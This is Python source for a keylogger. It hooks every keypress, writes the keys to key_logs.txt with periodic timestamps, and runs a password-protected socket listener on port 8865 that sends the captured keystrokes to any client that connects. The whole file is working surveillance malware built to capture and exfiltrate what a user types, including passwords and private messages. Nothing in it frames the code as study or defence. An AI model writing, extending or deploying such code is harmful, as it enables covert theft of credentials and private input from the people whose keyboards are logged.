#! Add import statements in a try-catch block
import keyboard
import time
import threading
import socket


'''
Add time to logs
[ time.asctime(time.gmtime()) ]
'''


class Keylogger:
    def __init__(self) -> None:
        self.log_file = 'key_logs.txt'
        keyboard.on_press(self.on_press)

        delayed_thread = threading.Thread(target=self.BreakTime)
        delayed_thread.start()

        server_thread = threading.Thread(target=self.exfil_data)
        server_thread.start()

        keyboard.wait()

    def on_press(self, event):
        with open(self.log_file, 'a') as logf:
            logf.write(f"{event.name}\t")

    def BreakTime(self):
        while True:
            print('[+]  Adding time log to file')
            with open(self.log_file, 'a') as logf:
                logf.write(f"\n[ {time.asctime(time.gmtime())} ]\n")
            time.sleep(10)  # 43200

    def exfil_data(self):
        '''
        Perform data exfiltration
        Open a port on the system 

        wait for a connection

        '''
        PORT = 8865

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('127.0.0.1', PORT))
        s.listen()

        while True:
            print('listening')
            client, addr = s.accept()
            print(f'connection received from {addr}')

            password = client.recv(1024).decode()
            if password != 'bad_password!@#PQWERD':
                exit()

            with open('key_logs.txt') as logfile:
                data = logfile.readlines()
                buf_size = len(data)

            client.send(str(buf_size).encode())
            client.send(str(data).encode())


Keylogger()
